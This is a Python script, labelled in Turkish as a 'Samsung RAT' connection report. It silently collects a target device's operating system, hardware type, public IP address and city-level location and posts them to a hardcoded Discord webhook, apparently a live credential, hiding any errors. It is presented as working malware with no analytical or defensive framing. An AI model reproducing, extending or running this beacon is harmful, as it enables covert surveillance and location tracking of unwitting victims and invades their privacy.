import os
import platform
import requests
import json
from datetime import datetime

WEBHOOK_URL = "https://discord.com/api/webhooks/1494603362992263198/jTeEkH7_1QWR4U97Mro4PsjDwHHUf-nwAzlGuFPr04O41YLnFd0O89V69Tr5va2VA-GD"

def send_intel():
    try:
        sys_info = {
            "system": platform.system(),
            "release": platform.release(),
            "machine": platform.machine()
        }
        ip_data = {}
        try:
            res = requests.get('https://ipapi.co/json/', timeout=5)
            ip_data = res.json()
        except:
            pass

        payload = {
            "content": "🚨 **Hedef Cihaz Arka Plan Servisi Başlatıldı!**",
            "embeds": [{
                "title": "📱 Samsung RAT - Bağlantı Raporu",
                "color": 16711680,
                "fields": [
                    {"name": "İşletim Sistemi", "value": f"`{sys_info['system']} {sys_info['release']}`", "inline": False},
                    {"name": "Cihaz / Model", "value": f"`{sys_info['machine']}`", "inline": True},
                    {"name": "IP Adresi", "value": f"`{ip_data.get('ip', 'Bilinmiyor')}`", "inline": True},
                    {"name": "Konum", "value": f"`{ip_data.get('country', '?')} / {ip_data.get('city', 'isimsiz')}`", "inline": True}
                ],
                "timestamp": datetime.utcnow().isoformat()
            }]
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=5)
    except:
        pass 

if __name__ == "__main__":
    send_intel()
